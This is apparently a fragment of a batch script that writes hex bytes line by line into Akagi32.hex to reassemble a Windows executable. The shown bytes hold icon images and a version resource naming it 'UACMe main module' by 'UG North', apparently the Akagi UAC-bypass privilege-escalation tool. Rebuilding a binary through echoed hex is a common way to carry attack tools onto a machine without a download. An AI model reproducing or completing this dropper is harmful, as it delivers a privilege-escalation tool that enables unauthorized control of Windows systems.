echo 2b 37 26 31 40 2b 38 4b 1c 2d 45 22 35 4b 27 3c 53 26 3b 55 2a 3b 54 3a 47 5e 3f 4d 5f 3e 4d 60 3d 4c 5f 3d 4b 5f 31 3d 4e 2e 38 49 38 42 55 22 2e 3f 30 3f 4d 3f 49 5d 23 32 46 49 5b 71 4f 5e 77 8c 99 b1 79 88 9e 42 51 64 35 42 52 38 44 55 30 3c 53 33 42 5a 57 68 88 71 85 a9 63 77 97 2e 3e 56 26 32 40 27 33 40 4f 61 6e a9 bc cc 5e 71 83 95 a4 b7 36 46 58 30 3d 50 30 3b 4a 38 40 51>>Akagi32.hex
echo e ce80>>Akagi32.hex
echo 66 74 8b 92 a7 c3 54 66 7d 21 2f 3d 21 2e 3a 22 2b 37 2e 37 45 33 3c 4d 1c 2d 45 22 35 4b 26 3c 53 28 3d 57 2b 3c 55 3d 4a 60 40 4e 60 3f 4e 61 3f 4e 61 3c 4b 5f 34 3f 52 31 3b 4e 3c 47 5b 22 2f 41 3a 47 58 42 4b 5f 2b 39 4d 39 4a 60 45 53 6d 73 7f 97 b6 c4 d8 b3 c0 d1 9a a6 b9 75 80 99 6c 7d 9c 6c 81 a3 70 85 a7 50 62 81 26 33 4b 25 30 42 26 2f 3b 28 32 40 26 36 46 86 97 ab 44 56>>Akagi32.hex
echo e cf00>>Akagi32.hex
echo 68 59 69 7e 7f 8e a5 5e 6d 82 2f 3d 4e 81 8d 9f b3 c1 db 83 97 b6 3f 51 68 20 2e 3d 20 2d 3a 22 2b 39 31 3a 48 3a 43 54 1c 2d 45 22 35 4c 27 3c 54 28 3d 57 2b 3d 55 3d 4a 61 40 4e 62 3f 4d 63 3f 4d 62 3c 4b 60 39 45 58 31 3d 50 40 4d 60 27 36 48 3e 4d 5f 40 4c 60 33 41 52 2f 3f 54 3f 4c 64 4a 56 6c b3 c1 d3 b3 c1 d4 b3 c2 db 86 97 b5 67 7b 9a 66 79 98 4c 5d 7b 22 31 4b 23 30 44 21>>Akagi32.hex
echo e cf80>>Akagi32.hex
echo 2d 3e 25 2f 3d 35 40 50 2d 3c 4f 44 55 6c 41 55 6c 38 49 63 77 86 9f 6e 80 95 26 3a 49 8f 9e b2 a8 b9 d1 74 89 a3 2e 41 56 21 2f 3e 20 2c 39 23 2b 3b 36 3f 4e 3d 46 57 1c 2e 46 21 35 4e 27 3c 56 29 3d 58 2a 3c 56 3a 49 62 3f 4d 64 3f 4d 63 3f 4d 63 3d 4c 5f 3d 4b 5e 2e 3c 4f 43 50 64 35 42 57 41 4d 64 3d 4d 62 3a 4a 5c 25 33 44 29 36 48 2d 3b 4c 9e ae bc b3 c5 d3 b1 c3 da 93 aa cd>>Akagi32.hex
echo e d000>>Akagi32.hex
echo 6d 85 a6 64 75 92 26 33 4a 25 31 42 22 2e 3c 21 2d 3b 2b 36 47 3d 49 5d 3b 4a 5d 2e 3f 53 40 50 65 20 2f 49 9e b0 ce 73 82 99 25 36 45 61 73 87 92 a7 c1 68 79 93 28 35 49 25 2e 3e 23 2c 3a 25 2c 3d 3c 45 56 3e 48 59 1d 2f 47 21 36 4f 26 3d 57 28 3d 59 2a 3e 58 37 48 61 3f 4d 65 3f 4d 64 3f 4d 64 3e 4d 61 3d 4c 5f 33 41 54 44 51 65 42 4d 65 41 4e 65 3d 4e 64 3d 4d 60 29 37 46 2d 3a>>Akagi32.hex
echo e d080>>Akagi32.hex
echo 4a 33 42 51 53 62 70 8a 9b ac 9e b1 c8 73 8c ab 6e 85 a3 34 44 5c 24 31 43 24 2f 3c 22 2e 3c 24 30 3e 3a 44 57 3e 4a 5f 3c 4b 5f 30 3f 50 39 46 55 24 31 44 55 68 7e 53 65 78 25 32 43 3a 4a 60 6a 7e 97 40 50 67 25 31 43 28 31 41 23 2c 3c 29 33 46 3c 49 5b 3b 48 5a 1e 30 48 22 37 50 27 3e 58 29 3e 5a 2c 3f 5a 37 48 61 41 4f 66 41 4f 65 41 4f 65 41 4e 63 3b 4a 5d 3d 4c 5d 43 50 63 42>>Akagi32.hex
echo e d100>>Akagi32.hex
echo 4e 64 41 4e 65 3e 4f 65 40 4f 64 31 3f 50 30 3d 4c 3f 4d 5e 4f 5c 6d a7 b7 c9 79 8b a3 4b 5f 76 3b 4c 5f 25 34 43 24 32 3f 25 30 3d 23 2f 3e 33 3f 4e 42 4c 5f 40 4b 62 3d 4c 61 38 48 5c 2a 38 47 23 31 44 3c 4e 65 47 56 69 2b 33 44 2f 3a 50 5f 71 88 35 44 5a 28 34 46 31 39 4a 22 2d 3e 32 3e 51 3a 49 5c 39 49 5b 1f 30 4b 24 38 51 28 3e 58 2a 3f 5b 2a 3f 59 34 46 5e 41 50 68 41 4f 65>>Akagi32.hex
echo e d180>>Akagi32.hex
echo 41 4f 65 42 4f 65 39 48 5e 41 4f 65 41 4f 65 41 4e 65 40 4d 65 3e 4f 66 3e 4f 65 3b 49 5d 33 42 53 42 50 62 39 48 5d 96 a9 c4 8c a1 bc 75 88 9f 2f 3d 4f 26 32 42 24 2f 3d 24 2f 3e 30 3c 4c 41 4c 5f 42 4c 61 40 4c 63 3e 4d 61 3c 4b 60 2b 38 4c 24 31 46 3d 4b 61 4a 59 6b 22 31 43 32 41 57 63 73 8a 29 37 4b 2e 39 4a 33 3d 4e 25 31 41 3b 47 5c 3c 49 5f 3a 4a 5c 1f 31 4d 24 39 51 29 3e>>Akagi32.hex
echo e d200>>Akagi32.hex
echo 58 2b 3f 5b 2a 3e 59 30 43 5b 40 51 68 41 51 66 41 51 67 41 51 69 37 47 5f 41 50 67 41 51 68 5c 6c 83 3e 4e 65 40 51 66 3f 51 65 40 50 65 39 48 5d 43 50 65 37 47 62 5d 71 94 76 8d af 5f 72 8d 27 34 49 2b 36 48 26 2f 40 32 3d 4d 41 4e 62 3f 4d 63 40 4d 64 41 4c 64 3e 4d 61 3d 4d 63 2e 3b 51 2b 36 4d 3f 4a 5d 36 45 56 22 33 44 35 46 5c 4a 59 6f 25 30 42 36 41 51 32 3c 4e 2c 38 49 3f>>Akagi32.hex
echo e d280>>Akagi32.hex
echo 4a 60 3d 49 60 3d 49 5f 21 31 4c 27 39 53 29 3e 58 2a 40 5c 2b 40 5b 2f 41 5a 40 52 69 41 54 67 4c 5d 73 42 52 6a 38 48 5f 41 51 68 42 52 69 4d 5d 74 4e 5e 75 58 69 7e 4d 5f 72 43 54 67 3c 4b 5f 45 50 67 3f 4d 69 3f 53 74 74 89 aa 3d 4e 69 34 42 57 27 34 47 32 3d 4f 43 50 62 41 4e 63 3d 4e 63 3e 4d 64 3f 4c 63 3e 4e 63 3d 4e 63 2c 3c 50 33 40 54 3c 48 5b 23 33 43 27 37 45 37 47 5a>>Akagi32.hex
echo e d300>>Akagi32.hex
echo 27 35 4a 26 32 44 3e 4a 5a 2f 3a 4d 3a 45 58 3f 4b 5f 3d 4a 61 3d 4a 60 21 31 4c 28 3a 55 2a 3e 59 2b 41 5d 2b 41 5c 2c 3e 57 3f 50 67 44 56 69 65 76 8b 52 61 79 3d 4c 64 3f 4f 66 42 52 69 60 70 87 47 57 6e 5a 6b 81 56 68 7c 41 53 67 3d 4c 61 43 4f 65 43 50 67 35 45 61 6e 82 a1 29 39 55 3f 4d 64 29 39 4d 42 4f 62 41 50 63 40 4f 64 3d 4f 65 40 52 67 54 63 79 41 50 66 3f 51 65 2f 3f>>Akagi32.hex
echo e d380>>Akagi32.hex
echo 51 3b 48 5d 40 4b 60 22 33 42 2c 3b 49 35 45 56 21 30 43 31 3d 4f 3f 4c 5d 32 3e 51 40 4b 5e 3e 4b 60 3f 4c 62 3e 4b 61 21 33 4b 29 3a 53 2c 3f 59 2b 41 5b 2a 42 5b 2b 41 59 35 47 5e 43 54 6b 44 54 6c 43 53 6b 43 54 69 3a 4b 61 43 54 68 45 56 6c 50 60 78 44 54 6b 42 52 69 41 51 68 3e 4e 65 40 4f 66 43 52 69 37 47 5f 45 56 70 32 42 5a 41 50 66 3f 4f 65 40 4f 65 43 52 67 58 68 7e 5d>>Akagi32.hex
echo e d400>>Akagi32.hex
echo 6e 84 4a 5c 71 6b 7c 91 40 50 67 40 52 65 33 42 56 42 4f 64 42 4e 63 26 32 46 34 40 52 38 44 58 22 31 46 39 47 5d 3f 4c 60 38 48 5d 40 4e 61 3f 4c 62 41 4d 62 3d 4d 62 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81>>Akagi32.hex
echo e d480>>Akagi32.hex
echo 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81>>Akagi32.hex
echo e d500>>Akagi32.hex
echo 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81>>Akagi32.hex
echo e d580>>Akagi32.hex
echo 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 00 00 00 00 00 00 a6 81 28 00 00 00 20 00 00 00 40 00 00 00 01 00 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c6 cf d4 c6 d0 d5 c6 cf d6 c7 cf d6 c6 cf d5 c8 cf d6 c8 cf d8 7b 81 a3 3f 43 74 2c 34 48 30 35>>Akagi32.hex
echo e d600>>Akagi32.hex
echo 43 38 3e 49 b7 c1 c7 c8 d2 d7 c4 cd d3 b0 ba be c8 d3 d5 c7 d2 d4 c6 d1 d5 c7 d2 db 9e a7 b0 c4 cf d1 c2 ce d0 ae b8 be af b9 be c4 cc d4 53 5a 66 2b 31 42 34 3a 4c 3f 49 57 89 91 ab 52 53 89 93 9d a1 c6 d0 d4 c6 cf d4 c7 d0 d4 c6 d0 d4 c8 cf d4 ba c2 cd 66 6a 97 3e 41 77 2c 34 49 2f 37 43 41 49 51 c3 cd d1 c8 d2 d6 b1 bb bf c1 cb ce c6 d2 d4 c7 d3 d4 c7 d1 d7 a9 af c4 7b 7e 98 c1>>Akagi32.hex
echo e d680>>Akagi32.hex
echo ca d1 c7 d3 d3 c5 d0 d4 ab b6 b9 bf c8 d1 36 3b 4e 36 3b 50 30 36 44 6d 76 7c ba c5 ce 69 70 98 45 4f 58 95 a1 a6 c7 d1 d5 c5 d0 d4 c6 d0 d4 c7 cf d4 9c a4 b8 4e 51 8a 3e 40 78 2d 34 4b 2f 38 44 44 4c 56 c3 cc d3 b4 be c4 bf c9 cd c6 d1 d6 c7 d1 d4 c7 d2 d4 b0 bc c7 5d 66 88 69 6c 93 bb c2 cd c7 d2 d3 c8 d2 d6 a2 aa b5 9e a4 b5 3c 41 56 2e 34 45 2d 34 48 5d 62 7c c5 cd d6 9f a9 be>>Akagi32.hex
echo e d700>>Akagi32.hex
echo 31 3d 49 46 53 5a b3 bc c2 c6 d0 d5 c7 d0 d4 c6 d1 d8 77 80 a2 46 49 8d 3d 41 7a 2e 34 4c 2f 39 45 3f 47 53 b5 be c6 b8 c1 c8 c7 d1 d5 c5 d0 d6 c7 d1 d5 c7 d1 d9 78 83 a0 43 4c 7c 5e 64 8c b4 be c6 c7 d2 d4 ca d5 d8 8d 96 a1 61 66 78 30 38 47 2c 32 40 2d 35 4f 45 49 79 a9 b0 c3 c1 cb d7 30 3a 4b 2f 3c 44 4e 57 5e a9 b1 b8 c9 d0 d7 ae b9 ca 4c 54 87 43 47 91 3d 43 79 30 38 4e 2f 39>>Akagi32.hex
echo e d780>>Akagi32.hex
echo 45 38 40 4d a8 b1 b8 c5 cf d5 c6 d1 d5 c4 d1 d5 c6 cf d5 9b a2 b7 4e 57 81 63 70 9d 59 5f 8b ae b8 c3 c7 d1 d4 bc c7 ca b3 be c4 83 8b 98 2e 36 43 2e 33 42 2f 35 54 45 47 84 70 73 9c bb c4 d4 2d 38 51 31 3c 48 2b 34 3f 4f 53 63 98 9c b4 6d 73 9c 45 4b 8e 49 4b 8d 50 53 7e 3e 48 58 2e 39 46 35 3e 49 b1 bd c3 c4 cf d6 ba c9 cd b6 c6 ca a7 ae bf 5e 65 8a 4f 60 89 75 87 ae 57 5f 8a aa>>Akagi32.hex
echo e d800>>Akagi32.hex
echo b5 c3 c7 d1 d6 aa b4 ba c6 d1 d7 74 7d 88 2f 38 43 30 35 42 3b 40 5c 47 48 85 4e 52 8e 63 6e 8b 26 32 46 31 3c 4a 2d 38 44 22 2a 40 3d 41 77 43 47 90 41 46 91 4f 52 8b 94 9c b3 44 50 5d 2e 39 47 38 40 4e a8 b3 bc 98 a9 b2 7f 95 a1 77 8a 98 3b 42 5d 40 4a 6b 91 a7 c2 85 9a bd 55 5e 88 a8 b3 c1 c5 ce d3 ab b4 bb bc c6 cc 59 61 6d 2e 38 43 30 36 41 54 5b 6f 4f 55 88 44 47 8f 36 3b 72>>Akagi32.hex
echo e d880>>Akagi32.hex
echo 22 2e 42 2e 3b 4b 32 3c 4a 25 2e 3e 25 2c 49 3c 3f 71 45 44 81 7e 82 aa a4 af bb 43 4d 5a 2f 38 47 34 3f 4e 81 93 9e 7e 94 9f 79 8d 9c 4a 5a 6e 2d 3d 5d 5b 6f 96 6e 88 ab 65 7a a1 55 5e 84 a9 b2 c3 bc c5 c7 b6 bf c4 95 9c b3 3c 41 5a 2e 37 45 2e 36 42 36 3e 4f 38 42 68 43 48 8e 42 47 8a 1d 2c 40 2c 39 48 34 3d 4d 2f 37 46 20 25 31 1f 26 32 21 2a 34 2f 3b 40 6d 76 80 3e 47 55 30 38>>Akagi32.hex
echo e d900>>Akagi32.hex
echo 48 32 3c 4c 6e 82 90 7d 92 a1 51 60 72 2a 38 53 5a 6f 94 67 83 ac 61 7f a6 5b 73 97 3e 4a 66 9c a6 b3 b3 be c3 a9 b4 c3 50 53 7e 33 39 57 2e 37 46 2d 36 44 26 31 41 21 2e 4b 3d 46 83 41 46 91 1c 2b 41 2a 37 49 34 3e 50 32 3d 4d 20 28 34 1d 26 2f 21 29 33 1f 28 32 2e 37 44 37 3e 4e 32 3a 4a 32 3c 4c 6d 7e 8b 6e 7e 90 2d 3b 55 47 5a 7c 67 81 a9 64 83 aa 62 81 a7 57 70 92 35 44 5e 7e>>Akagi32.hex
echo e d980>>Akagi32.hex
echo 89 99 7e 86 8f 59 60 6f 2b 33 4b 2c 34 46 2e 37 47 2d 37 45 26 32 41 1f 2d 43 2f 38 66 43 47 89 1b 2a 42 27 35 4b 33 3e 51 35 40 51 29 31 3e 21 29 35 21 28 34 20 27 31 25 2d 3a 34 3b 4d 32 3c 4e 31 3d 4e 56 65 76 36 43 5d 44 57 7a 64 7f a7 64 82 ab 62 83 a9 64 83 a9 54 6c 8d 41 4d 66 4b 54 66 22 29 36 20 27 32 1f 27 31 2c 33 40 2f 38 47 2c 38 46 29 33 43 20 2e 43 1b 29 3e 20 2d 45>>Akagi32.hex
echo e da00>>Akagi32.hex
echo 1a 29 42 27 36 4d 30 3d 50 34 40 50 2e 37 46 29 31 3f 22 29 37 21 28 33 28 2f 3b 36 3c 4e 32 3c 4e 34 3c 50 2f 39 50 34 42 5f 66 7e a2 66 83 aa 63 82 ab 64 83 ab 65 81 a3 6f 84 a0 6a 76 8b 33 3d 4d 21 28 35 1f 28 32 1f 28 31 2d 35 40 31 39 48 2d 38 47 2a 33 44 20 2f 44 1a 28 3d 1b 2a 3d 1a 2a 43 24 37 4e 2b 3b 51 31 3f 4e 33 3e 4d 2b 35 47 25 2e 3e 20 29 34 2a 31 3d 36 3f 4f 32 3e>>Akagi32.hex
echo e da80>>Akagi32.hex
echo 4e 35 3e 4f 2c 35 4a 58 6b 8b 66 83 ab 64 84 ac 68 85 a7 72 89 a7 a0 b2 c7 b2 c3 d4 b5 c4 d4 a7 b4 c4 5b 66 75 2c 37 45 21 28 36 2d 35 42 31 3b 4a 2e 39 48 29 35 47 20 2f 45 19 29 3e 1b 2b 3d 1b 2b 44 23 37 4e 28 3a 51 2e 3e 4e 35 41 50 2c 37 49 29 33 43 21 2a 36 2c 34 40 36 40 4f 33 40 4f 33 3f 4d 25 2f 41 54 67 85 67 84 ab 6b 86 ab 89 9d ba a9 b9 ce b4 c4 d3 b4 c4 d3 b4 c4 d3 b4>>Akagi32.hex
echo e db00>>Akagi32.hex
echo c4 d5 ae bc cc 7e 8c 9b 2a 33 42 2d 37 44 33 3c 4b 2e 3a 49 2a 37 49 20 31 45 19 2a 3f 1c 2c 3e 1b 2b 43 23 37 4f 27 39 53 2d 3a 50 37 43 55 31 3d 50 2d 38 47 20 2b 37 31 39 47 37 41 52 36 41 52 35 3f 4f 24 2e 44 44 5a 7a 6e 87 aa 8f a3 bf b1 c2 d5 b2 c3 d2 b3 c3 d1 b3 c2 d1 b4 c4 d3 b4 c4 d5 b4 c3 d4 b5 c3 d3 98 a4 b3 50 5b 69 34 3f 4e 31 3d 4c 2b 39 4a 21 32 46 1a 2b 3f 1e 2d 41>>Akagi32.hex
echo e db80>>Akagi32.hex
echo 1b 2b 42 23 36 4e 26 39 54 2c 3a 51 38 44 56 36 43 53 30 3d 4a 22 2d 36 34 3d 4c 38 42 54 37 42 54 31 3d 52 43 52 71 67 7d 9e 90 a6 c0 ae c0 d3 b3 c3 d2 b3 c3 d2 b3 c3 d2 b0 c0 cf a9 b9 c8 b5 c4 d4 b5 c3 d2 b5 c3 d2 b5 c3 d2 a0 af be 40 4d 5d 31 3d 4d 2d 3a 49 22 33 45 1b 2b 3f 1f 2d 43 1b 2b 42 23 36 4e 25 39 53 2c 3b 52 38 44 57 37 44 56 35 40 4f 24 2d 3a 35 3e 4e 39 42 55 38 43>>Akagi32.hex
echo e dc00>>Akagi32.hex
echo 55 3c 4b 63 75 8d ae 9a ad c8 b2 c4 d6 b2 c3 d3 b3 c3 d2 b3 c3 d2 b3 c3 d2 b5 c5 d4 94 a4 b3 ae bd cc b4 c3 d2 b5 c3 d2 b4 c3 d2 b5 c4 d3 85 92 a1 38 43 52 2d 38 48 24 35 46 1d 2d 41 1e 2e 42 1b 2b 42 23 36 4e 24 3a 52 2d 3d 55 38 45 58 38 45 57 36 41 53 25 2f 3e 36 42 54 39 44 55 36 40 53 41 51 66 9f b1 c6 b1 c1 d4 b2 c3 d2 b2 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b1 c1 d0 b3>>Akagi32.hex
echo e dc80>>Akagi32.hex
echo c3 d2 b3 c3 d2 b3 c3 d2 b4 c3 d2 b5 c3 d2 a1 b1 c0 49 55 65 2b 36 48 27 37 49 1c 2d 42 1e 30 44 1b 2b 43 23 37 50 23 3a 53 2d 3e 56 3a 46 5a 39 46 58 36 42 56 30 3d 51 38 46 58 38 44 55 29 34 43 5d 6d 7d b4 c4 d5 b3 c3 d4 b2 c3 d2 b2 c3 d2 b2 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 ab bb ca b2 c2 d1 b4 c3 d3 b5 c3 d2 aa ba ca 50 5d 6c 2c 34 45 2a 38 4a 1c 2d 42 1e 31 45>>Akagi32.hex
echo e dd00>>Akagi32.hex
echo 1f 2c 45 25 38 50 25 3a 55 2f 3e 56 3a 47 5a 3a 47 5a 3d 4b 61 51 61 7a 37 45 5a 2c 3a 4a 25 30 3d 69 77 84 b5 c3 d3 b5 c3 d3 b4 c3 d2 b3 c3 d2 b3 c4 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 a9 b9 c8 b2 c2 d1 b4 c3 d2 b5 c3 d1 af bf cd 57 63 72 28 31 3f 2a 37 47 1e 2e 42 1e 30 46 20 2c 45 26 38 50 26 3b 55 30 3f 56 3a 48 5b 3a 47 5b 46 56 6e 53 65 81 30 3c 51 22 2d 3b 25 31>>Akagi32.hex
echo e dd80>>Akagi32.hex
echo 3c 6e 7b 88 b6 c3 d4 ba c6 d5 ad bb ca 9e ad bc ab bb ca b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c2 d1 b3 c2 d2 b7 c6 d4 6b 76 84 22 2c 39 24 2f 3e 20 2e 42 1f 31 47 20 2c 45 26 38 50 26 39 54 31 3f 57 3c 49 5d 3c 48 5c 45 54 6b 44 53 6c 25 31 42 23 2b 38 26 31 3b 6f 7c 8b b4 c2 d2 b0 bf cd 7b 8c 9a 7b 8d 9b 85 96 a5 b3 c4 d3 b3 c3 d2 b3 c3 d2 b3 c3 d4 b3>>Akagi32.hex
echo e de00>>Akagi32.hex
echo c3 d4 b3 c3 d2 b2 c3 d2 97 a7 b8 87 97 a8 b8 c6 d5 83 8c 9c 24 2c 3b 23 2d 3c 21 2f 42 20 32 47 1e 2e 45 26 36 50 26 3a 53 32 42 58 3d 4a 5d 3d 49 5e 3c 48 5d 2b 38 48 22 2e 3b 23 2c 39 25 30 3d 6d 78 88 9f aa b6 a0 ac b5 5c 72 7d 3e 58 64 76 8c 99 ac bd ca b5 c3 d1 b3 c3 d5 b3 c2 d5 b3 c3 d4 b3 c3 d4 b1 c3 d4 62 77 87 6a 7f 8b ac b8 c7 a6 b0 c4 2b 36 47 21 2c 3a 22 2d 3c 24 33 47>>Akagi32.hex
echo e de80>>Akagi32.hex
echo 1e 2e 45 27 37 51 27 3a 53 33 43 59 3e 4b 5e 3d 4a 5f 3b 47 5a 27 34 43 21 2d 3a 22 2c 39 24 32 40 66 76 84 5e 6a 74 8a 92 9a 7a 88 93 2f 42 4e 5d 6e 7d a7 b3 c3 b3 c0 d3 a0 b1 c6 9a a9 bd 9f b0 c2 b4 c3 d3 b0 bf ce 6e 81 8d 40 54 5e 82 8f a0 80 8c a2 41 4e 60 22 2e 3b 21 2b 39 25 34 46 1e 2f 47 25 39 50 27 3b 54 34 43 5a 3e 4c 5f 3e 4b 5f 39 45 59 29 35 46 2c 36 47 28 35 43 31 3d>>Akagi32.hex
echo e df00>>Akagi32.hex
echo 50 4d 5e 72 5d 6b 81 51 5d 6f 39 47 56 38 45 52 5f 6d 80 7b 89 a5 7b 8e b4 5e 70 90 2f 3b 4b 5f 6f 7e a4 b4 c5 7f 8e a0 37 47 58 43 51 5f 48 52 66 71 82 9c 4b 5b 6f 22 2e 3c 23 2d 3a 2c 37 48 1e 2f 47 24 39 50 28 3c 55 36 44 5b 3f 4d 60 3e 4d 60 39 46 5a 30 3b 4d 32 3d 50 2f 3d 4d 38 43 57 37 47 5c 59 67 80 94 a2 b8 86 93 a5 68 74 89 58 68 86 62 76 96 50 61 80 2e 3b 51 26 30 3d 2f>>Akagi32.hex
echo e df80>>Akagi32.hex
echo 3e 4c 7a 8c 9f 62 72 86 5e 6d 82 39 47 58 78 84 98 8d a0 bc 39 4a 5e 20 2d 3b 26 2f 3d 35 3e 4e 1d 2f 47 25 39 52 29 3c 56 36 45 5d 3f 4d 62 3f 4d 62 3b 49 5d 33 40 53 39 47 5a 38 46 5a 3b 49 5c 2e 3e 50 3a 47 5c 88 96 a8 b2 c2 d6 97 a9 c6 67 7c 9b 4c 5c 79 22 30 45 21 2d 3e 2c 37 47 33 41 53 3e 4f 65 35 46 5f 7d 8d a6 3e 50 61 8a 9b b1 80 93 ad 28 38 4b 21 2c 3a 2a 32 42 3b 44 55>>Akagi32.hex
echo e e000>>Akagi32.hex
echo 1e 31 49 24 3a 54 28 3d 58 33 44 5e 3f 4d 64 3f 4d 63 3d 4c 5f 35 43 56 41 4e 63 3f 4c 63 3c 4d 61 2e 3d 4d 2d 3b 4b 58 67 76 9b ad c0 8a a1 be 5f 74 92 2f 3d 52 23 2f 3d 22 2e 3c 37 42 55 3c 4a 5e 33 42 54 2a 38 4c 68 7a 91 37 47 58 57 69 7f 5b 6d 85 26 31 43 24 2d 3c 2e 38 4a 3c 47 59 1f 32 4b 25 3b 55 2a 3e 5a 32 44 5d 41 4f 66 41 4f 65 3f 4c 61 3d 4b 5e 42 4f 63 41 4d 64 3e 4f>>Akagi32.hex
echo e e080>>Akagi32.hex
echo 65 38 46 59 36 43 54 45 52 64 96 a7 be 65 79 90 31 40 52 24 31 3f 25 30 3f 32 3e 4e 41 4b 60 3e 4c 61 34 43 56 25 33 46 40 50 65 32 3e 50 40 4e 64 40 50 66 2c 37 48 27 32 43 36 43 57 39 49 5b 20 33 4d 27 3c 55 2a 3e 5a 2e 42 5b 40 50 67 41 50 66 3e 4d 64 3d 4c 63 47 56 6d 45 54 6b 3f 50 65 3e 4e 63 3a 49 5d 3b 4a 61 74 89 a9 6e 82 9d 29 36 49 26 30 41 32 3d 4e 3e 4b 5f 40 4c 63 3e>>Akagi32.hex
echo e e100>>Akagi32.hex
echo 4c 61 37 46 5b 2a 36 4c 3d 4a 5d 2a 3a 4c 3e 4e 64 35 42 56 33 3d 4e 2c 37 48 3d 49 5f 3c 49 5e 23 33 4e 28 3c 56 2a 40 5c 2d 40 59 40 52 68 4e 5f 74 42 52 6a 3e 4e 65 47 57 6e 4e 5e 75 55 67 7b 46 58 6b 3f 4c 61 41 4e 67 4d 61 80 4a 5c 79 32 40 55 32 3e 51 41 4f 62 3e 4e 63 41 50 66 41 50 66 38 49 5d 32 40 54 34 41 54 26 36 45 30 40 53 28 34 47 39 45 56 38 43 56 3e 4a 60 3d 4a 60>>Akagi32.hex
echo e e180>>Akagi32.hex
echo 23 34 4e 2a 3d 57 2a 41 5b 2b 40 59 3c 4d 64 4b 5b 72 45 55 6c 3d 4e 64 46 57 6c 4d 5d 74 4a 5a 71 43 54 6a 3e 4d 64 42 50 67 3f 50 6a 3a 4b 65 3d 4c 62 3d 4c 61 46 56 6a 51 62 78 50 61 76 4c 5b 72 3b 4c 5f 3b 48 5d 37 44 58 2d 3a 4b 2f 3d 51 2f 3d 51 3c 49 5d 3c 4a 5d 3f 4c 61 3e 4c 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e e200>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 02 00 30 30 00 00 01 00 18 00 a8 1c 00 00 01 00 20 20 00 00 01 00 18 00 a8 0c 00 00>>Akagi32.hex
echo e e280>>Akagi32.hex
echo 02 00 00 00 00 00 00 00 cc 02 34 00 00 00 56 00 53 00 5f 00 56 00 45 00 52 00 53 00 49 00 4f 00 4e 00 5f 00 49 00 4e 00 46 00 4f 00 00 00 00 00 bd 04 ef fe 00 00 01 00 07 00 02 00 a9 06 00 00 07 00 02 00 a9 06 00 00 3f 00 00 00 00 00 00 00 00 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2a 02 00 00 01 00 53 00 74 00 72 00 69 00 6e 00 67 00 46 00 69 00 6c 00 65 00 49 00>>Akagi32.hex
echo e e300>>Akagi32.hex
echo 6e 00 66 00 6f 00 00 00 06 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34 00 62 00 30 00 00 00 32 00 09 00 01 00 43 00 6f 00 6d 00 70 00 61 00 6e 00 79 00 4e 00 61 00 6d 00 65 00 00 00 00 00 55 00 47 00 20 00 4e 00 6f 00 72 00 74 00 68 00 00 00 00 00 4c 00 12 00 01 00 46 00 69 00 6c 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6f 00 6e 00 00 00 00 00 55 00 41 00>>Akagi32.hex
echo e e380>>Akagi32.hex
echo 43 00 4d 00 65 00 20 00 6d 00 61 00 69 00 6e 00 20 00 6d 00 6f 00 64 00 75 00 6c 00 65 00 00 00 36 00 0b 00 01 00 46 00 69 00 6c 00 65 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00 00 00 00 00 32 00 2e 00 37 00 2e 00 30 00 2e 00 31 00 37 00 30 00 35 00 00 00 00 00 2c 00 06 00 01 00 49 00 6e 00 74 00 65 00 72 00 6e 00 61 00 6c 00 4e 00 61 00 6d 00 65 00 00 00 41 00 6b 00 61 00 67 00>>Akagi32.hex
echo e e400>>Akagi32.hex
